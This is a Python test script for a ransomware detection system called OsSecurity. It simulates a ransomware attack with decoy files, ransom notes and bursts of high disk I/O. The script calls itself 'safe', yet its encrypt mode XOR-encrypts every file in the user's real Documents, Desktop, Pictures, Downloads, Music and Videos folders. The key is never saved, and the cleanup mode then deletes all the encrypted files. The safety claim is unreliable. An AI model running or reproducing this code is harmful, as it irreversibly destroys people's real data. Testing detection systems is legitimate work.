#!/usr/bin/env python3
"""
Fake Ransomware — Safe test script for OsSecurity detection system.

Creates realistic files in user directories, then encrypts them
with high I/O to trigger the ransomware detection pipeline.

Walks the REAL user directories (Desktop, Documents, Pictures)
just like real ransomware would — so it naturally encounters
honeypot decoy files placed there by the detection system.

Usage:
  Terminal 1: sudo python3 main.py                # Detection system
  Terminal 2: python3 fake_ransomware.py create    # Set up fake files
  Terminal 3: python3 fake_ransomware.py encrypt   # Start "attack"
  Terminal 3: python3 fake_ransomware.py cleanup   # Remove all test files

Requires: Linux (uses /proc for I/O stats)
"""

import os
import sys
import time
import argparse
from pathlib import Path

VICTIM_ROOT = Path("/tmp/fake_ransomware_victims")

# Directories ransomware typically targets — same dirs the honeypot plants decoys in
SCAN_DIRS = [
    Path.home() / "Documents",
    Path.home() / "Desktop",
    Path.home() / "Pictures",
    Path.home() / "Downloads",
    Path.home() / "Music",
    Path.home() / "Videos",
]

# Subdirectory where we create test victim files (so cleanup is easy)
VICTIM_SUBDIR = "test_victims"

# File types ransomware cares about
FILE_EXTENSIONS = [
    ".txt", ".doc", ".docx", ".xls", ".xlsx",
    ".pdf", ".jpg", ".png", ".csv", ".json",
]


def create_victim_files() -> list[Path]:
    """Create realistic file structures in user directories."""
    all_files = []

    for scan_dir in SCAN_DIRS:
        victim_dir = scan_dir / VICTIM_SUBDIR
        victim_dir.mkdir(parents=True, exist_ok=True)

        subdirs = ["work", "personal", "projects", "finances"]
        for subdir_name in subdirs:
            subdir = victim_dir / subdir_name
            subdir.mkdir(exist_ok=True)

            for i in range(8):
                ext = FILE_EXTENSIONS[(i + hash(subdir_name)) % len(FILE_EXTENSIONS)]
                file_path = subdir / f"document_{i:03d}{ext}"
                if ext == ".jpg":
                    file_path.write_bytes(os.urandom(50 * 1024))
                elif ext == ".pdf":
                    file_path.write_bytes(b"%PDF-1.4\n" + os.urandom(100 * 1024))
                elif ext in (".xlsx", ".docx"):
                    file_path.write_bytes(os.urandom(80 * 1024))
                else:
                    content = f"Important Document #{i}\n"
                    content += "=" * 50 + "\n"
                    content += f"Category: {subdir_name}\n"
                    content += f"Created: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                    content += "=" * 50 + "\n"
                    content += "Confidential data: " + "X" * 200 + "\n"
                    file_path.write_text(content)

                all_files.append(file_path)

        for i in range(5):
            ext = FILE_EXTENSIONS[i % len(FILE_EXTENSIONS)]
            file_path = victim_dir / f"important_{i:03d}{ext}"
            file_path.write_text(f"Top-level document {i}\n" + "A" * 500 + "\n")
            all_files.append(file_path)

    VICTIM_ROOT.mkdir(parents=True, exist_ok=True)
    for i in range(20):
        ext = FILE_EXTENSIONS[i % len(FILE_EXTENSIONS)]
        file_path = VICTIM_ROOT / f"file_{i:03d}{ext}"
        file_path.write_bytes(os.urandom(100 * 1024))
        all_files.append(file_path)

    print(f"[CREATE] Created {len(all_files)} files")
    return all_files


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """Simple XOR encryption (safe demo — not real crypto)."""
    key_stream = (key * (len(data) // len(key) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, key_stream))


def _collect_target_files() -> list[Path]:
    """
    Walk all real user directories — same behavior as real ransomware.
    This naturally finds honeypot files (.HONEYPOT_*) because we walk
    the same directories the honeypot plants them in.
    """
    all_files = []

    # Walk the real user directories (Desktop, Documents, Pictures, etc.)
    for scan_dir in SCAN_DIRS:
        if not scan_dir.is_dir():
            continue
        for f in scan_dir.rglob("*"):
            if not f.is_file():
                continue
            # Skip already-encrypted files
            if f.name.endswith(".encrypted"):
                continue
            # Skip our own ransom notes
            if f.name == "README_DECRYPT_YOUR_FILES.txt":
                continue
            all_files.append(f)

    # Walk /tmp victims too
    if VICTIM_ROOT.is_dir():
        for f in VICTIM_ROOT.rglob("*"):
            if f.is_file() and not f.name.endswith(".encrypted"):
                all_files.append(f)

    return all_files


def encrypt_files(duration_sec: float = 30.0) -> None:
    """
    Walk user directories and encrypt files — mimics real ransomware.

    Key behavior: walks ~/Desktop, ~/Documents, ~/Pictures, etc.
    recursively — just like real ransomware. This means it WILL
    encounter and encrypt the honeypot decoy files, which triggers
    the detection system to confirm ransomware and kill this process.

    Should trigger:
    1. Monitor: high write_bytes above 50 MB/s
    2. Detector: SUSPICIOUS after sustained high I/O
    3. Honeypot: decoy files in user dirs get encrypted → CONFIRMED
    4. Detector: SIGKILL
    """
    print(f"\n[ATTACK] Starting encryption attack for up to {duration_sec}s...")
    print(f"[ATTACK] PID: {os.getpid()} (watch for this in the detector logs)")
    print()

    all_files = _collect_target_files()

    if not all_files:
        print("[ERROR] No files found. Run 'create' first.")
        return

    print(f"[ATTACK] Found {len(all_files)} files to encrypt")
    for d in SCAN_DIRS:
        if d.is_dir():
            count = sum(1 for _ in d.rglob("*") if _.is_file() and not _.name.endswith(".encrypted"))
            print(f"  {d}: {count} files")

    start_time = time.time()
    bytes_written = 0
    encrypted_count = 0
    key = os.urandom(32)

    # Write a ransom note (classic ransomware behavior)
    for scan_dir in SCAN_DIRS:
        if scan_dir.is_dir():
            try:
                note = scan_dir / "README_DECRYPT_YOUR_FILES.txt"
                note.write_text(
                    "ATTENTION: Your files have been encrypted!\n"
                    "Send 1 BTC to recover your data.\n"
                    "[This is a SAFE TEST — OsSecurity detection test]\n"
                )
            except (PermissionError, OSError):
                pass

    end_time = start_time + duration_sec
    file_idx = 0

    while time.time() < end_time:
        # Refresh file list periodically (honeypot may add new files)
        if file_idx % 30 == 0:
            all_files = _collect_target_files()

        if not all_files:
            print("[ATTACK] No more files to encrypt. Stopping.")
            break

        target = all_files[file_idx % len(all_files)]

        try:
            original = target.read_bytes()
            encrypted = xor_encrypt(original, key)

            # Write encrypted content back
            target.write_bytes(encrypted)

            # Rename to .encrypted (like real ransomware)
            encrypted_path = target.with_suffix(target.suffix + ".encrypted")
            target.rename(encrypted_path)

            bytes_written += len(encrypted)
            encrypted_count += 1

        except (PermissionError, OSError):
            pass

        file_idx += 1

        # Print progress every 20 files
        if file_idx % 20 == 0:
            elapsed = time.time() - start_time
            if elapsed > 0:
                mbps = (bytes_written / (1024 * 1024)) / elapsed
                print(f"[ATTACK] {encrypted_count} files encrypted | "
                      f"{bytes_written / (1024*1024):.1f} MB written | "
                      f"{mbps:.1f} MB/s | "
                      f"{elapsed:.0f}s elapsed")

        # Burst write to spike I/O above 50 MB/s
        if file_idx % 3 == 0:
            burst_file = VICTIM_ROOT / f"burst_{file_idx}.tmp"
            try:
                burst_file.write_bytes(os.urandom(2 * 1024 * 1024))  # 2MB burst
                bytes_written += 2 * 1024 * 1024
                burst_file.unlink(missing_ok=True)
            except OSError:
                pass

    actual_duration = time.time() - start_time
    if actual_duration > 0:
        mbps = (bytes_written / (1024 * 1024)) / actual_duration
    else:
        mbps = 0

    print(f"\n[DONE] Encryption stopped after {actual_duration:.1f}s")
    print(f"[DONE] {encrypted_count} files encrypted, {bytes_written / (1024*1024):.1f} MB written")
    print(f"[DONE] Average rate: {mbps:.1f} MB/s")
    if mbps > 50:
        print("[DONE] Rate EXCEEDS 50 MB/s threshold — SHOULD be detected")
    else:
        print(f"[DONE] Rate below 50 MB/s threshold — may evade detection")


def cleanup_files() -> None:
    """Remove all test victim files and encrypted artifacts."""
    print("[CLEANUP] Removing test files...")

    # Remove our test_victims subdirectories
    for scan_dir in SCAN_DIRS:
        victim_dir = scan_dir / VICTIM_SUBDIR
        if not victim_dir.exists():
            continue
        for f in victim_dir.rglob("*"):
            if f.is_file():
                try:
                    f.unlink()
                except OSError:
                    pass
        for d in sorted(victim_dir.rglob("*"), reverse=True):
            if d.is_dir():
                try:
                    d.rmdir()
                except OSError:
                    pass
        try:
            victim_dir.rmdir()
        except OSError:
            pass
        print(f"  Cleaned: {victim_dir}")

    # Remove any .encrypted files left in user directories (from interrupted attacks)
    for scan_dir in SCAN_DIRS:
        if not scan_dir.is_dir():
            continue
        for f in scan_dir.rglob("*.encrypted"):
            try:
                f.unlink()
            except OSError:
                pass
        # Remove ransom notes
        note = scan_dir / "README_DECRYPT_YOUR_FILES.txt"
        if note.exists():
            try:
                note.unlink()
            except OSError:
                pass

    # Remove /tmp victims
    if VICTIM_ROOT.exists():
        for f in VICTIM_ROOT.rglob("*"):
            if f.is_file():
                try:
                    f.unlink()
                except OSError:
                    pass
        for d in sorted(VICTIM_ROOT.rglob("*"), reverse=True):
            if d.is_dir():
                try:
                    d.rmdir()
                except OSError:
                    pass
        try:
            VICTIM_ROOT.rmdir()
        except OSError:
            pass
        print(f"  Cleaned: {VICTIM_ROOT}")

    print("[CLEANUP] Done.")


def main():
    if sys.platform != "linux":
        print("[ERROR] This script requires Linux (/proc filesystem).")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="Fake Ransomware — Safe test script for OsSecurity",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
How to use:
  Terminal 1:  sudo python3 main.py                    # Start detection
  Terminal 2:  python3 fake_ransomware.py create        # Set up fake files
  Terminal 3:  python3 fake_ransomware.py encrypt       # Run attack
  Terminal 3:  python3 fake_ransomware.py cleanup       # Clean up after
"""
    )

    parser.add_argument(
        "action",
        choices=["create", "encrypt", "cleanup", "all"],
        help="Action: create files, encrypt them, clean up, or run all sequentially"
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=30.0,
        help="Duration in seconds for encryption attack (default: 30)"
    )

    args = parser.parse_args()

    print("=" * 60)
    print("FAKE RANSOMWARE — OsSecurity Detection Test")
    print(f"PID: {os.getpid()} | Action: {args.action}")
    print("=" * 60)

    if args.action == "create":
        create_victim_files()

    elif args.action == "encrypt":
        encrypt_files(args.duration)

    elif args.action == "cleanup":
        cleanup_files()

    elif args.action == "all":
        create_victim_files()
        print("\n[PAUSE] Files created. Starting encryption in 3 seconds...")
        time.sleep(3)
        encrypt_files(args.duration)
        print("\n[PAUSE] Attack done. Cleaning up in 5 seconds...")
        time.sleep(5)
        cleanup_files()


if __name__ == "__main__":
    main()
